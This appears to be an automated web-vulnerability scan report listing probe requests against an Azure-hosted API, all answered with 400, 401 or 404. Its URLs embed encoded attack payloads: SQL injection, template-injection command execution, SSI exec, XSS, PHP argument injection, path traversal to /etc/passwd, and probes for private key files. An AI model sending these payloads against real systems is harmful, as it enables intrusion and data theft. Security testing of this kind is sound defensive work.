* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/app/etc/local.xml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/BitKeeper
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/CHANGELOG.txt
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/composer.json
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/composer.lock
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/config/database.yml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/config/databases.yml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/core
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/CVS/root
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/DEADJOE
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/elmah.axd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/favicon.ico
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/filezilla.xml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/i.php
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/id_dsa
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/id_rsa
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/info.php
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/key.pem
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/lfm.php
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/myserver.key
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/phpinfo.php
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/privatekey.key
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/server-info
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/server-status
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/server.key
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/sftp-config.json
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/sitemanager.xml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/sites/default/files/.ht.sqlite
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/sites/default/private/files/backup_migrate/scheduled/test.txt
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/test.php
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/trace.axd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/vb_test.php
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/vim_settings.xml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/WEB-INF/applicationContext.xml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/WEB-INF/web.xml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/winscp.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/WS_FTP.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net%3Faaa=bbb
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 400`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 400`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/health
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/health%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest/
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%2522%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%2522%252Bresponse.write%2528758%252C919*211%252C285%2529%252B%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%2522%252F%253E%253Cxsl%253Avalue-of+select%253D%2522system-property%2528%2527xsl%253Avendor%2527%2529%2522%252F%253E%253C%2521--
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%2522%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%2522%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B%2524var%253D%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%2522%253E%253C%2521--%2523EXEC+cmd%253D%2522dir+%255C%2522--%253E%253C
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%2522%253E%253C%2521--%2523EXEC+cmd%253D%2522ls+%252F%2522--%253E%253C
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%2522case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%2522java.lang.Thread.sleep%2522%252815000%2529
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%2523%257B%2525x%2528sleep+15%2529%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%2523%257Bglobal.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%2523set%2528%2524engine%253D%2522%2522%2529%250A%2523set%2528%2524proc%253D%2524engine.getClass%2528%2529.forName%2528%2522java.lang.Runtime%2522%2529.getRuntime%2528%2529.exec%2528%2522sleep+15%2522%2529%2529%250A%2523set%2528%2524null%253D%2524proc.waitFor%2528%2529%2529%250A%2524%257Bnull%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%2524%257B%2540print%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%2524%257B%2540print%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%257D%255C
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%2524%257B__import__%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%252C+shell%253DTrue%2529%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%2527%2522%2500%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%2527%2522%253Cimg+src%253Dx+onerror%253Dprompt%2528%2529%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%2527%2522%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%2527%2528
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%2527%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%2527%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B%2524var%253D%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%2527case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%2529%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%252Bresponse.write%2528%257B0%257D*%257B1%257D%2529%252B
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%252F
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%252F%252F980414377652208366.owasp.org
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%252Fetc%252Fpasswd
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%252Fsuggest
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%252FWEB-INF%252Fweb.xml
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%253B
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%253C
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%253C%2521--
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%253C%2521--%2523EXEC+cmd%253D%2522dir+%255C%2522--%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%253C%2521--%2523EXEC+cmd%253D%2522ls+%252F%2522--%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%253C%2523assign+ex%253D%2522freemarker.template.utility.Execute%2522%253Fnew%2528%2529%253E+%2524%257B+ex%2528%2522sleep+15%2522%2529+%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%253C%2525%253D%2525x%2528sleep+15%2529%2525%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%253C%2525%253D+global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%2525%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%253Cxsl%253Avalue-of+select%253D%2522document%2528%2527http%253A%252F%252Fs198d01-ebis-establishment-fa.azurewebsites.net%253A22%2527%2529%2522%252F%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%253Cxsl%253Avalue-of+select%253D%2522php%253Afunction%2528%2527exec%2527%252C%2527erroneous_command+2%253E%2526amp%253B1%2527%2529%2522%252F%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%253Cxsl%253Avalue-of+select%253D%2522system-property%2528%2527xsl%253Avendor%2527%2529%2522%252F%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%253Cxsl%253Avalue-of+select%253D%2522system-property%2528%2527xsl%253Avendor%2527%2529%2522%252F%253E%253C%2521--
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%253Cxsl%253Avariable+name%253D%2522rtobject%2522+select%253D%2522runtime%253AgetRuntime%2528%2529%2522%252F%253E%250A%253Cxsl%253Avariable+name%253D%2522process%2522+select%253D%2522runtime%253Aexec%2528%2524rtobject%252C%2527erroneous_command%2527%2529%2522%252F%253E%250A%253Cxsl%253Avariable+name%253D%2522waiting%2522+select%253D%2522process%253AwaitFor%2528%2524process%2529%2522%252F%253E%250A%253Cxsl%253Avalue-of+select%253D%2522%2524process%2522%252F%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%255Csuggest
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%255CWEB-INF%255Cweb.xml
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%255D%255D%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%257B%257B%2522%2522.__class__.__mro__%255B1%255D.__subclasses__%2528%2529%255B157%255D.__repr__.__globals__.get%2528%2522__builtins__%2522%2529.get%2528%2522__import__%2522%2529%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%2529%257D%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%257B%257B%253D+global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529+%257D%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%257B%257B__import__%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%252C+shell%253DTrue%2529%257D%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%257B%257Brange.constructor%2528%2522return+eval%2528%255C%2522global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%255C%2522%2529%2522%2529%2528%2529%257D%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%257Bsystem%2528%2522sleep+15%2522%2529%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252FWindows%252Fsystem.ini
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255CWindows%255Csystem.ini
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
